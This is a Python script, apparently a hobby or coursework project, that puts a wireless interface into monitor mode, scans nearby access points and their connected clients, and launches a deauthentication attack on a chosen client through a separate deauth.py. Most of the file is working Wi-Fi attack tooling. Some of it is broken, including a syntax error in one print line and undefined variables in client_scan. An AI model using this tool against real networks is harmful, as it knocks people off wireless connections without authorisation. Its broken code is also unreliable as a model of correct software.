import os
import sys
import socket
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap, Dot11Deauth
#import pandas




ESSID = 0
BSSID = 1
CHANNEL = 2

ap_mac = ""
ap_list = []
client_list = []
ssids_set = set()



#networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])

# Set the index BSSID (MAC address of the AP)
#networks.set_index("BSSID", inplace=True) 

# stop_hopper = False
  
  

  
# Console colors
W  = '\033[0m'  # white 
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan


##############################################
############### Interface Mode ###############
##############################################

# In this function the user choose the interface that will scan the network and send the deauthentication packets. #
# In order to do so, we need to switched this interface to 'monitor mode'. #
def monitor_mode():
    global interface
    print(G + "Step 1:  Choosing an interface to put in 'monitor mode' \n")
    empty = input ("Press Enter to continue.........\n")
    print(W)
    os.system('ifconfig')
    interface = input(G + "Please enter the interface name you want to put in 'monitor mode': ")
    print(W)
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode monitor')
    os.system('ifconfig ' + interface + ' up')
    # os.system('iwconfig') #check

# After we finish our attack, we want to switch back the interface to 'managed mode'. #
def managed_mode():
    print(G + "\nStep 5: Reset the interface mode. \n")
    empty = input ("Press Enter in order to put " + interface + " in 'managed mode' .........\n")
    print(W)
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode managed')
    os.system('ifconfig ' + interface + ' up')
    print(R + "[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
    os.system('iwconfig')



##############################################
############### APs Scanning #################
##############################################

# Rapper function for 'wifi_scan()'. #
def ap_scan():
    print(G + "Step 2: Scanning the network for AP to attack. \n")
    empty = input ("Press Enter to continue.........\n")
    # os.system ('airodump-ng ' + interface)
    wifi_scan()


# In this fucntion we scan the network for nearby access points. #
# We present to the user all the APs that were found, and he choose which AP he want to attack. #
def wifi_scan():
    global search_timeout
    search_timeout = int(input(G + "Please enter the scanning time frame in seconds:"))
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    print("\n Scanning for networks...\n")
    sniff(iface=interface, prn=scan_netwroks, timeout=search_timeout)
    num = len(ap_list)
    if num > 0: 
        # If at least 1 AP was found. #
        print("\n*************** APs Table ***************\n")
        for x in range(num):
            print("[" + str(x) + "] - BSSID: " + ap_list[x][BSSID] + " \t Channel:" + str(ap_list[x][CHANNEL]) + " \t AP name: " + ap_list[x][ESSID]) 
#        print("\n--------------------------------------------\n")
        print("\n************* FINISH SCANNING *************\n")
        result = int(input("Please enter the number of the AP you want to attack: "))
        # stop_hopper = True
        print("ch:", int(ap_list[result][CHANNEL]), end='\t')
        print("bssid:", ap_list[result][BSSID])
        set_channel(int(ap_list[result][CHANNEL]))
        scan_clients(ap_list[result][BSSID], ap_list[result][ESSID])
    else: 
        # If no AP was found. #
        rescan = input("No networks were found. Do you want to rescan? [Y/N] \n")
        if rescan == "Y":
            wifi_scan()
        else:
            print("#  Sorry :(  #")


# In order to scan the network for multiple APs we need to check with each channel in the range [1,14]. #
# Usually routers will use the 2.4GHz band with a total of 14 channels.#
# (In reality it may be 13 or even less that are used around the world.) #
def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel in range [1,14] each 0.5 seconds
        ch = ch % 14 + 1
        time.sleep(0.5)


# After the user choose the AP he want to attack, we want to set the interface's channel to the same channel as the choosen AP. #
def set_channel(channel):
    os.system('iwconfig %s channel %d' % (interface, channel))


# sniff(..., prn = scan_netwroks, ...) #
# The argument 'prn' allows us to pass a function that executes with each packet sniffed. #
# The intended purpose of this function (scan_netwroks(pkt)) is to control how the packet prints out in the console, and allowing us to replace the default packet printing display with a format of your choice. #
def scan_netwroks(pkt):
    if pkt.haslayer(Dot11Beacon):
        # Get the BSSID (MAC ADDR) of the AP
        bssid = pkt[Dot11].addr2
        # Get the ESSID (name) of the AP
        ssid = pkt[Dot11Elt].info.decode()
        if ssid not in ssids_set:
            ssids_set.add(ssid)
            stats = pkt[Dot11Beacon].network_stats()
            # Get the channel of the AP
            channel = stats.get("channel")
            ap_list.append([ssid, bssid, channel])
            # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (ssid, bssid, channel))
            # print ("BSSID: %s,\t Channel: %d, \t AP name: %s." %(bssid,channel, ssid))


##############################################
############# Clients Scanning ###############
##############################################

#Done
def scan_clients(rmac, addr):
    global ap_mac
    ap_mac = rmac #ap_mac
    time = search_timeout * 2
    print("\nScanning for clients that connected to: " + )
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    sniff(iface=interface, prn=only_clients, timeout=time)
    print("\n----------- Client's Table ---------------------\n")
    for x in range(len(client_list)):
        print('[',x ,']', client_list[x])
    print("\n----------- FINISH SCANNING --------------------\n")
    result = input("Choose the number of client you want to attack or type 'r' for rescan: ")
    if result == 'r':
        scan_clients(rmac, addr)
    elif result == 'q':
        return
    elif result.isnumeric():
        deauth_attack(int(result), ap_mac)
    else:
        return

#Done
def only_clients(pkt):
    global client_list
    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and \
            pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                client_list.append(pkt.addr1)
                print("Client mac:", pkt.addr1)


#Done
def deauth_attack(client_idx, ap):
    client_mac = client_list[client_idx]
    print("\nStep 4: Disconnect the connection between the AP from the client. \n")
    print("The packets will be sent non-stop. Press 'Ctrl+C' to stop sending the packets. \n")
    empty = input ("Press Enter to start sending the Deauthentication packets.........\n")
    print(W)
    os.system('python3 deauth.py ' + client_mac + ' ' + ap + ' ' + interface)


def client_scan():
    print("\nStep 3: Verifying that at least 1 client is connected to the AP you choose. \n")
    print("You will see all the traffic of the choosen AP. When you see a client that is connected to the AP, press 'Ctrl+C' to stop scaning.\n")
    empty = input ("Press Enter to continue.........\n")
    print(W)
    os.system('airodump-ng ' + interface + ' --bssid ' + ap + ' --channel ' + channel)
    client = input(G + "Please enter the MAC ADDR of the client: ")
    print("\n")





if __name__ == "__main__":
    
    if os.geteuid():
        sys.exit(R + '[**] Please run as root')
    
    print(B + "********************************************************************** \n")
    print("***** Part 1: choosing the AP we want to attck and attacks it ;) ***** \n")
    print("********************************************************************** \n")
    
    ### Choosing the interface for monitoring, and put it in monitor mode.
    monitor_mode()
#    print("\n" + R +"!! - IMPORTANT:" + W +" In the end don't forget to put the interface back in 'managed mode'. You can do that by running the command - python3 managed_mode.py " + interface + "\n")

    ### Choosing the AP that we want to attack.
    ap_scan()
    
    ### Checking that the choosen AP have client that connected to it.
    # client_scan()
    
    ### Running the deauthentication script.
    # deauth_attack()
    
    ### Put the interface back in managed mode  
    managed_mode()
    



